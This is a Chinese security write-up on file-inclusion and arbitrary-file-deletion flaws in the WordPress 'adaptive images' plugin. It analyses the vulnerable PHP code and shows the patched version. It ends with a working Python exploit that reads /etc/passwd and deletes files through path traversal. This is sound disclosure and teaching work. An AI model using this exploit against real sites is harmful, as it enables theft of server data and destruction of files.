##  前言

 **在编写代码时，常常需要为不同的判断执行不同的动作，if
条件判断语句可以用来实现此功能。然而这么一个再平常不过的条件判断语句，如果使用不当，也可能成为漏洞的产生点。在 WordPress
中有一个使用非常广泛的插件，名为「adaptive
images」。该插件可提供自适应图像，以透明的方式调整和优化传送到移动设备的图像，从而显著地减少页面的加载时间。正是因为在使用 if
语句的过程中，没有严格地控制逻辑和流程，所以导致了文件包含漏洞（File Inclusion）和任意文件删除漏洞（Arbitrary File
Deletion）的产生。这两个漏洞一旦被黑客利用，将会产生严重的后果，比如系统信息泄露、用户信息泄露以及关键文件被删除等等。在版本号 <=0.6.66 的
adaptive images 插件中存在上述漏洞。**

##  实验环境

> 1\. 目标主机：Debian9.6 x6
>
> 2\. 软件版本：wordpress-5.2.2
>
> 3\. 插件版本：adaptive-images.0.6.65
>
> 4.XAMPP for Linux 5.6.305.python-2.7.15

##  漏洞分析

1\. 第一段源代码具体如下所示：

    
    
        function adaptive_images_script_get_settings () {
            if ( ! isset( $_REQUEST['adaptive-images-settings'] ) ) {
                $current_directory  = dirname( $_SERVER['SCRIPT_FILENAME'] );
                $resolutions    = array( 1024, 600, 480 );
                $landscape      = TRUE;
                $hidpi          = TRUE;
                $wp_content_dir = realpath( $current_directory . '/../../' );
                $wp_content_url = 'http://' . $_SERVER['HTTP_HOST'] . '/wp-content';
                $cache_dir      = "cache/adaptive-images";
                $jpg_quality    = 65;
                $png8           = FALSE;
                $sharpen        = TRUE;
                $watch_cache    = TRUE;
                $browser_cache  = 60*60*24*7;
                $user_settings_file = realpath( $current_directory . '/user-settings.php' );
                if ( file_exists( $user_settings_file ) ) {
                    include( 'user-settings.php' );
                }
                
                $request_uri    = parse_url( urldecode( $_SERVER['REQUEST_URI'] ), PHP_URL_PATH );
                $wp_content_url = preg_replace( '/^https?/',  '', $wp_content_url );
                $url            = preg_replace( '/^https?/',  '', adaptive_images_script_get_url() . $request_uri );
                $source_file    = str_ireplace( $wp_content_url, $wp_content_dir, $url );
                
                if ( isset( $_GET['resolution'] ) ) {
                    
                    $cookie_resolution = $_GET['resolution'];
                } else if ( isset( $_COOKIE['resolution'] ) ) { 
                    $cookie_resolution = $_COOKIE['resolution'];
                } else {
                    $cookie_resolution = null;
                }
                $client_width  = $resolutions[0];
                $pixel_density = 1;
                if ( ! isset( $cookie_resolution ) || isset( $cookie_resolution ) && ! preg_match( "/^[\d]+[,]+[\d]+[\.]?[\d]*$/", $cookie_resolution ) ) { 
                    setcookie( 'resolution', '', time() - 100 );
                } else { 
                    $cookie_array = explode( ',', $cookie_resolution );
                    if ( count( $cookie_array ) > 0 ) { 
                        $client_width  = intval( $cookie_array[0] );
                    }
                    if ( $hidpi ) { 
                        if ( count( $cookie_array ) > 1 ) { 
                            $pixel_density = $cookie_array[1];
                        }
                    }
                }
                $client_width_scaled = $client_width * $pixel_density;
                $resolution = $resolutions[0];
                foreach ( $resolutions as $breakpoint ) {
                    if ( $client_width_scaled <= $breakpoint ) {
                        $resolution = $breakpoint;
                    }
                }
                $debug = isset( $_GET['debug'] ) ? $_GET['debug'] : FALSE;
                $_REQUEST['adaptive-images-settings'] = array( 
                    'debug'          => $debug,
                    'resolutions'    => $resolutions,
                    'cache_dir'      => $cache_dir,
                    'jpg_quality'    => $jpg_quality,
                    'png8'           => $png8,
                    'sharpen'        => $sharpen,
                    'watch_cache'    => $watch_cache,
                    'browser_cache'  => $browser_cache,
                    'request_uri'    => $request_uri,
                    'source_file'    => $source_file,
                    'wp_content'     => $wp_content_dir,
                    'client_width'   => $client_width,
                    'hidpi'          => $hidpi,
                    'pixel_density'  => $pixel_density,
                    'resolution'     => $resolution
                );
            }
            return $_REQUEST['adaptive-images-settings'];
    }

1.1 函数 adaptive_images_script_get_settings 用于获取脚本的配置参数；

1.2 语句 if ( ! isset( $_REQUEST['adaptive-images-settings'] ) )，通过 isset
方法来判断变量$_REQUEST['adaptive-images-settings'] ) 是否存在且其值是否为 NULL。如果该变量不存在或者其值为
NULL，那么则根据默认配置来重写并组合它，最后返回变量$_REQUEST['adaptive-images-settings'] 的值。

1.3 如果变量$_REQUEST['adaptive-images-settings'] ) 存在且其值不为
NULL，那么就直接返回该变量的值。于是问题来了，什么情况下$_REQUEST['adaptive-images-settings'] ) 存在且其值不为
NULL？在有人蓄意构造的情况下，该变量一定是存在且其值不为 NULL。通过控制此变量，黑客可以利用这两个漏洞进行恶意攻击。

2\. 第二段源代码具体如下所示：

    
    
    $settings = adaptive_images_script_get_settings();

通过调用函数 adaptive_images_script_get_settings() 来给变量$settings
赋值，这样攻击者蓄意构造的参数就被传导到了全局。

3\. 第三段源代码具体如下所示（文件包含漏洞产生）：

    
    
        if ( ! isset( $_GET['resolution'] ) && ! isset( $_COOKIE['resolution'] ) ) { 
            adaptive_images_script_send_image( $settings['source_file'], $settings['browser_cache'] );
            exit();
    }

3.1 调用 adaptive_images_script_send_image 函数，将 source_file
的内容发送给客户端，正常情况下，source_file 的内容是图片文件。

3.2 通过设置参数$settings['source_file']（也就是$_REQUEST['adaptive-images-settings']['source_file']），攻击者就可以利用文件包含漏洞了。

4\. 第四段源代码具体如下所示（任意文件删除漏洞产生）：

    
    
        $cache_file = $settings['wp_content'] . '/' . $settings['cache_dir'] . '/' . $settings['resolution'] . $settings['request_uri'];
        if ( file_exists( $cache_file ) ) { 
            
            if ( $settings['watch_cache'] ) { 
                adaptive_images_delete_stale_cache_image( $settings['source_file'], $cache_file, $settings['resolution'] );
            }
    }

4.1 将$settings 中的各个参数值拼接起来后，赋值给变量$cache_file，此时攻击者构造的参数值也就已经传入变量$cache_file 中。

4.2 然后调用 adaptive_images_delete_stale_cache_image 函数，攻击者就可以利用任意文件删除漏洞来删除相应的文件。

5\. 函数 adaptive_images_delete_stale_cache_image 的源代码具体如下所示：

    
    
        function adaptive_images_delete_stale_cache_image ( $source_file, $cache_file, $resolution ) {
            if ( file_exists( $cache_file ) ) {
                if ( filemtime( $cache_file ) >= filemtime( $source_file ) ) {
                    return $cache_file;
                }
                unlink( $cache_file );
            }
    }

如果缓存文件新于源文件，那么函数返回缓存文件；否则，使用 unlink 函数删除缓存文件。这里 $cache_file 和$source_file
都可以特意构造，将想要删除的文件赋值给$cache_file，就可以实现任意文件的删除操作。

##  漏洞修复

针对版本号<=0.6.66 的插件中存在的这两个漏洞，建议及时将 adaptive images 更新到 0.6.67。在 0.6.67
版本中，问题代码得到了修复，修复后的代码如下：

    
    
        global $settings;
        $settings = NULL;
        function adaptive_images_script_get_settings () {
            $current_directory  = dirname( $_SERVER['SCRIPT_FILENAME'] );
            $resolutions    = array( 1024, 600, 480 );
            $landscape      = TRUE;
            $hidpi          = TRUE;
            $wp_content_dir = realpath( $current_directory . '/../../' );
            $wp_content_url = 'http://' . $_SERVER['HTTP_HOST'] . '/wp-content';
            $cache_dir      = "cache/adaptive-images";
            $jpg_quality    = 65;
            $png8           = FALSE;
            $sharpen        = TRUE;
            $watch_cache    = TRUE;
            $browser_cache  = 60*60*24*7;
            $user_settings_file = realpath( $current_directory . '/user-settings.php' );
            if ( file_exists( $user_settings_file ) ) {
                include( 'user-settings.php' );
            }
            
            $request_uri    = parse_url( urldecode( $_SERVER['REQUEST_URI'] ), PHP_URL_PATH );
            $wp_content_url = preg_replace( '/^https?/',  '', $wp_content_url );
            $url            = preg_replace( '/^https?/',  '', adaptive_images_script_get_url() . $request_uri );
            $source_file    = str_ireplace( $wp_content_url, $wp_content_dir, $url );
            
            if ( isset( $_GET['resolution'] ) ) {
                
                $cookie_resolution = $_GET['resolution'];
            } else if ( isset( $_COOKIE['resolution'] ) ) { 
                $cookie_resolution = $_COOKIE['resolution'];
            } else {
                $cookie_resolution = null;
            }
            $client_width  = $resolutions[0];
            $pixel_density = 1;
            if ( ! isset( $cookie_resolution ) || isset( $cookie_resolution ) && ! preg_match( "/^[\d]+[,]+[\d]+[\.]?[\d]*$/", $cookie_resolution ) ) { 
                setcookie( 'resolution', '', time() - 100 );
            } else { 
                $cookie_array = explode( ',', $cookie_resolution );
                if ( count( $cookie_array ) > 0 ) { 
                    $client_width  = intval( $cookie_array[0] );
                }
                if ( $hidpi ) { 
                    if ( count( $cookie_array ) > 1 ) { 
                        $pixel_density = $cookie_array[1];
                    }
                }
            }
            $client_width_scaled = $client_width * $pixel_density;
            $resolution = $resolutions[0];
            foreach ( $resolutions as $breakpoint ) {
                if ( $client_width_scaled <= $breakpoint ) {
                    $resolution = $breakpoint;
                }
            }
            $debug = isset( $_GET['debug'] ) ? $_GET['debug'] : FALSE;
            global $settings;
            $settings = array( 
                'debug'          => $debug,
                'resolutions'    => $resolutions,
                'cache_dir'      => $cache_dir,
                'jpg_quality'    => $jpg_quality,
                'png8'           => $png8,
                'sharpen'        => $sharpen,
                'watch_cache'    => $watch_cache,
                'browser_cache'  => $browser_cache,
                'request_uri'    => $request_uri,
                'source_file'    => $source_file,
                'wp_content'     => $wp_content_dir,
                'client_width'   => $client_width,
                'hidpi'          => $hidpi,
                'pixel_density'  => $pixel_density,
                'resolution'     => $resolution
            );
    }

这其中的改进主要有以下两点：

> 第一、删除局部变量$_REQUEST['adaptive-images-settings']，改用全局变量$settings，同时删除该函数的返回值；
>
> 第二、删除条件判断语句 if ( ! isset( $_REQUEST['adaptive-images-settings'] )
> )，全局变量$settings 的值需要由函数生成，这样就阻断了通过 URL 蓄意构造参数值的途径，文件包含漏洞和任意文件删除漏洞也就得以修复。

##  漏洞利用

1\. 漏洞利用的 exp 具体如下所示：

    
    
    #-*- coding:utf-8 -*-    import requests
    print "\n[*] Adaptive images <=0.6.66 for Wordpress PoC: LFI and arbitrary file deletion By Neroqi"
    server_ip = raw_input('输入服务器 IP 地址：')
    option = raw_input('文件包含请输入 1，文件删除请输入 2：')
    if option == '1':
        source_file1 = raw_input('输入包含路径和文件名：')
        exp1 = requests.get("http://" + server_ip + "/wordpress/wp-content/uploads/2019/10/timg.jpg?adaptive-images-settings[source_file]=" + source_file1)
        print exp1.text
    elif option == '2':
        source_file2 = raw_input('输入源文件的路径及文件名：')
        cache_dir = raw_input('输入要删除文件的路径：')
        cache_file = raw_input('输入要删除文件的文件名：')
        requests.get("http://" + server_ip + "/wordpress/wp-content/uploads/2019/10/timg2.jpg?adaptive-images-settings[source_file]=" + source_file2 + "&adaptive-images-settings[resolution]=&resolution=16000&adaptive-images-settings[wp_content]=.&adaptive-images-settings[cache_dir]=" + cache_dir + "&adaptive-images-settings[request_uri]=" + cache_file + "&adaptive-images-settings[watch_cache]=1")
        exp2 = requests.get("http://" + server_ip + "/wordpress/wp-content/uploads/2019/10/timg2.jpg?adaptive-images-settings[source_file]=" + cache_file)
        print exp2.text
    else:
        exit()

2\. 首先输入服务器的 IP 地址，然后输入 option 值，当 option 的值为 1 时，exp 对 LFI
漏洞进行利用，这里我们成功地包含了/etc/passwd，结果如下图所示：![](https://image.3001.net/images/20191018/1571403230_5da9b5ded6c3a.png!small)再次对/proc/version
进行包含，服务器返回了 Linux
的系统版本信息，结果如下图所示：![](https://image.3001.net/images/20191018/1571403245_5da9b5edbba47.png!small)3\.
当 option 的值为 2 时，exp
对任意文件删除漏洞进行利用，分别输入源文件的路径及文件名、要删除文件的路径及文件名，这里源文件的路径及文件名输入../../../wp-content/uploads/2019/10/timg2.jpg，要删除文件的路径及文件名分别输入../../.. 和 test.php，文件
timg2.jpg 比 test.php
新。在执行完删除操作之后，使用文件包含去确认是否删除成功，结果如下图所示：![](https://image.3001.net/images/20191018/1571403262_5da9b5fea48a6.png!small)

「Original image not found or not available」说明 test.php 已经被成功删除。

##  总结：

在编码过程中使用条件判断语句时，一定要注意使用规范和代码逻辑，不能够允许终端用户进行越权操作，特殊的文件操作行为要限定特定用户才有权限，比如后台删除文件的操作，必须限制管理员才能操作，否则可能产生漏洞，影响系统安全。

 ***本文原创作者： Neroqi，本文属于FreeBuf原创奖励计划，未经许可禁止转载**

  

